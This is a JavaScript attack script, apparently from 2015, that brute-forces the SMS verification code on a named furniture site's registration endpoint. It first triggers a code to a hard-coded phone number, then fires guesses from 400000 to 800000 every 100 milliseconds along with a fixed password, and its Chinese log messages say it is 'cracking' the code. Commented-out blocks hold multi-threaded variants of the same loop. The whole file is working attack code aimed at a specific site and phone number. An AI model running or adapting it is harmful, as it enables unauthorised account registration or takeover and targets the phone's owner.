/**
 * Created by Administrator on 2015/9/23.
 */



var PL = function (tel) {
    var self = this;
    this.tel = tel;
    this.yzm = null;
    this.setYzm = function () {
        $.ajax({
            url: "http://www.jimei.cn/verifyCode",
            data: "phone=" + self.tel + "&date=" + new Date().getTime(),
            type: "get",
            dataType: "json",
            success: function () {
                console.log("1：获取验证码 等待暴利破解！");
            }
        });
    }
    //this.setYzm();

    this.pj = function (yzm) {
        $.ajax({
            // url: "http://www.jimei.cn/isuserregiste.html?password=jimeijiaju&pwdconfirm=jimeijiaju&verifyCode=10000&phone=15801606666",
            data: {
                "phone": self.tel,
                "password": "jimeijiaju",
                "pwdconfirm": "jimeijiaju",
                "verifyCode": yzm
            },
            type: "post",
            dataType: "json",
            success: function (data) {
                console.info("破解验证码：" + yzm);
            }
        });

    };

    this.init = function (s, e) {

        var s = s;

        if (s == e) {
            clearInterval(this.timer);
        } else {
            this.timer = setInterval(function () {
                self.pj(s);
                s++;
            }, 100);
        }
        /*   var flag = false;
         setTimeout(function () {

         (function (i) {
         for (var k = 1; k < self.handleNum; k++) {
         (function (u) {
         self.pj(i * 100000 + u);
         })(k);
         //console.info("k:" + i * 100000 + k)
         }
         })(1);
         },200);
         setTimeout(function () {
         (function (i) {
         for (var k = 1; k < self.handleNum; k++) {
         (function (u) {
         self.pj(i * 100000 + u);
         })(k);
         //console.info("k:" + i * 100000 + k)
         }
         })(2);

         },300);*/
        /*   for (var i = 1; i < this.thread; i++) {


         (function (i) {
         for (var k = 1; k < self.handleNum; k++) {
         (function (u) {
         self.pj(i * 100000 + u);
         })(k);

         //console.info("k:" + i * 100000 + k)
         }
         })(i);


         console.info("启动线程：" + i);


         /!*(function (i) {
         var func = function (startNum) {
         var start = startNum;
         return function (endNum) {
         for (var j = start; j < endNum; j++) {
         self.pj(j);
         }
         }
         }
         func(i * 1000)((i + 1) * 10000);
         })(i);*!/

         }*/
    }
}
var p = new PL('15641978618');
p.init(400000, 800000);
/*PL.start = function (tel) {
 new PL(tel);
 }
 PL.start('15801606666');*/
